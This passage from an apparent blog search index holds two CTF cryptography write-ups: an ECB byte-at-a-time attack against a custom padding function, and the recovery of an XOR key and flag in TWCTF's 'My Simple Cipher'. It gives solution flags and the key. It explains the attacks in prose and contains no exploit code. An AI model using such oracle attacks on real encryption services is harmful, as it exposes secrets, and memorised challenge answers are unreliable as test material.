writes the result of mod_encrypt function to stdout.The ApproachSo now that we have an overall idea of the challenge lets dive into the solution:First lets analyse the enryption function:The very first thing that catchtes the eye is what the functiosn returns- &quot;&quot;.join(&quot;{:02x}&quot;.format(ord(c)) for c in cipher.encrypt(raw))What this piece of code essentially does is takes each character in the ciphertext and encodes it into hex. So now we know the output will be the hex encoded ciphertext.So thats done. Now lets move on to the real interesting part of the problem!! THE mod_pad function!! ### Analysing mod_pad Lets analyse the code step by step:if input_len &amp;gt; PAD_LIMIT: excess_len = input_len - PAD_LIMIT if excess_len &amp;gt; flag_size: padded_inp = inp[flag_size:flag_size + PAD_LIMIT] else: padded_inp = inp[:flag_size - excess_len] + inp[flag_size:] return padded_inp else: padded_inp= pad(inp) return padded_inpFirst the input length is being checked to determine if it is greater than 48.If it is, then the excess length is calculated and then two further conditions are being checked out of this the formerone is not so important as such as we will see soon.(as to get the answer we only need to satisfy the latter of the two conditions)NOTE: plaintext = flag + user_input.What the else condition does is adds two modified parts of plaintext.The first part inp[:flag_size - excess_len] creates a string in which the flag is present but depending on the excess length that many characters are replaced from the end (i.e from right to left) by the user input.The second part inp[flag_size:] is just taking the user input present after the flag string and adding it to the first part.so just think if the user input is such that the excess length is flag_size-1 then the cipher text will start with the first character of flag follwed by 47 user input characters (lets take that to be a) so we get ciphertext = first_chr_of_flag+&#39;a&#39;*47 .Now if you have been following the writeup crystal clear you probably know whats the solution and assuming you havethen yup its nothing other than the famous ECB byte at a time attack!!!! a rather twisted version of it but the core logic is same.Here we implement the attack from the first character of the ciphertext by setting the initial excess length to flag_size-1 and then we iterate in a loop and on each iteration excess length is reduced by one therby exposing one extra character of the flag each time.AND VOILLA YOU GET THE FLAG: ctfFlag{Vishvesh_S_Rao}in this case it is my own flag that i had to set as i couldnt nc to get the actual flag file :)" }, { "title": "My Simple Cipher - TWCTF", "url": "/posts/My-Simple-Cipher.en/", "categories": "CTF-Wrtieups", "tags": "Crypto, mod, eqn solving", "date": "2020-02-01 17:55:28 +0800", "snippet": "Overview Of The ChallengeThe challenge involved an encryption program which performed the following encryption to genereate the cipher text:for i in range(0, len(message)): encrypted += chr((ord(message[i]) ^ ord(key[i % len(key)]) ^ ord(encrypted[i]))%128)encrypted is the ciphertext and a random ascii character was added to it before the encryption loop.The goal was to find the flag from a message which consisted essentially three parts The flag A predefined character | And a keyAn output of the encryption program was given which when hex decoded gave a ciphertext of length 36.Consequently I found out the Length of the flag part by subtracting ciphertext length from key lentgth plus 2 (taking into account the predefined chracter|.and the randomly generated ascii character)The ApproachSince in the encryption equation there are two unknowns it seems impossible to find the key and hence the flag.The idea here is that the program already gives us a character in the message namel the predefined character |whose position we know.taking the position of that character as i value we can get the correspnding value of the character at index i%13 in key. On the index counter of the list message the corresponding vlaue of key[i%13] will be at the position message[22+i%13] (as Key comes after flag text and the predefined character)Now I have got message[22+i%13].Now i can assign i to i=22+i%13. If I put these three instructions: Finding value of key[i%13] Assigning that value to message[22+i%13] Changing value of i to 22+i%13In a loop that repets 12 times what we surprisingly get is nothing other than value of key in all its thirteen characters!!!The core logic behind this piece of code is pretty easy eliminate one unkown out of the two which essentially solves the challenge to a very large extent .Here the variable being elimnated is messge[i].We do this by assignig message[index] the value of the key which we find in the first loop instruction and consequently assigning that iwith value indexin the third loop instruction so that when the loop iterates the next time the value for message[i] is no longer an unknown thus we find out the entire key (but not the full message).Now with only one unknown finding the complete message is childs play (just solve the encryption equation with message[i] as the unknown)In the end we get the key as: ENJ0YHOLIDAY!Flag as: TWCTF{Crypto-is-fun!}" } ]
